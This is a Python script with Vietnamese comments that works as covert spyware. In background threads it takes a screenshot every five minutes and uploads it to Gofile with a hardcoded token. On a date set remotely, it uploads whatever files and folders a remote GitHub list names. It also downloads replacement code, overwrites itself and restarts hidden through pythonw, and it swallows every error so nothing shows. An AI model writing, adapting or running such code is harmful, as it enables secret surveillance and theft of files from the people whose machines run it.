import threading
import time
import os
import sys
import pyautogui
import requests
from datetime import datetime

# --- CẤU HÌNH ---
CURRENT_VERSION = "1.0.1"
VERSION_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/version"
UPDATE_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/monitor.py"
DAY_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/day"
UPLOAD_LIST_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/upload"

# Thông tin Gofile
GOFILE_TOKEN = "vc5njCimJvXwoDEtsidgrTWoU9ZW61w6"
FOLDER_ID_SCREENSHOT = "f0211191-7505-4226-b5a1-cbede323189b" 
FOLDER_ID_SCHEDULED = "87f4488e-5d6d-4d65-b6e0-9bd05273f62d"  
UPLOAD_ENDPOINT = "https://upload.gofile.io/uploadfile"

# Đường dẫn gốc tránh lỗi Permission System32
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
uploaded_files = set()

# --- HÀM UPLOAD ---
def upload_to_gofile(file_path, folder_id):
    if not os.path.exists(file_path):
        return False
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            data = {'folderId': folder_id, 'token': GOFILE_TOKEN}
            response = requests.post(UPLOAD_ENDPOINT, files=files, data=data, timeout=60)
        return response.json().get('status') == 'ok'
    except:
        return False

# --- TÁC VỤ 1: TỰ ĐỘNG CẬP NHẬT ---
def check_for_updates():
    while True:
        try:
            response = requests.get(VERSION_URL, timeout=15)
            remote_version = response.text.strip()
            if remote_version != CURRENT_VERSION:
                new_code = requests.get(UPDATE_URL, timeout=15).text
                with open(__file__, "w", encoding="utf-8") as f:
                    f.write(new_code)
                # Khởi động lại bằng pythonw để tiếp tục chạy ẩn
                os.execv(sys.executable, [sys.executable.replace("python.exe", "pythonw.exe"), __file__])
        except:
            pass
        time.sleep(600) # Kiểm tra mỗi 10 phút

# --- TÁC VỤ 2: CHỤP ẢNH MÀN HÌNH ---
def take_screenshot():
    while True:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"IMG_{timestamp}.png"
            full_save_path = os.path.join(BASE_DIR, filename)
            
            pyautogui.screenshot().save(full_save_path, optimize=True, quality=80)
            if upload_to_gofile(full_save_path, FOLDER_ID_SCREENSHOT):
                if os.path.exists(full_save_path):
                    os.remove(full_save_path)
        except:
            pass
        time.sleep(300)

# --- TÁC VỤ 3: UPLOAD THEO LỊCH ---
def scheduled_upload_task():
    while True:
        try:
            day_res = requests.get(DAY_URL, timeout=15)
            target_day = day_res.text.strip()
            today = datetime.now().strftime("%d/%m/%Y")
            
            if target_day == today:
                list_res = requests.get(UPLOAD_LIST_URL, timeout=15)
                paths = [p.strip() for p in list_res.text.split(',') if p.strip()]
                
                for path in paths:
                    if not os.path.exists(path): continue
                    
                    if os.path.isfile(path):
                        if path not in uploaded_files:
                            if upload_to_gofile(path, FOLDER_ID_SCHEDULED):
                                uploaded_files.add(path)
                    
                    elif os.path.isdir(path):
                        for root, _, files in os.walk(path):
                            for file in files:
                                f_path = os.path.join(root, file)
                                if f_path not in uploaded_files:
                                    if upload_to_gofile(f_path, FOLDER_ID_SCHEDULED):
                                        uploaded_files.add(f_path)
        except:
            pass
        time.sleep(900)

# --- KHỞI CHẠY ---
if __name__ == "__main__":
    os.chdir(BASE_DIR)
    
    # Tạo các luồng xử lý
    threads = [
        threading.Thread(target=check_for_updates, daemon=True),
        threading.Thread(target=take_screenshot, daemon=True),
        threading.Thread(target=scheduled_upload_task, daemon=True)
    ]
    
    for t in threads:
        t.start()

    # Giữ tiến trình chính chạy ngầm tuyệt đối
    while True:
        time.sleep(10)
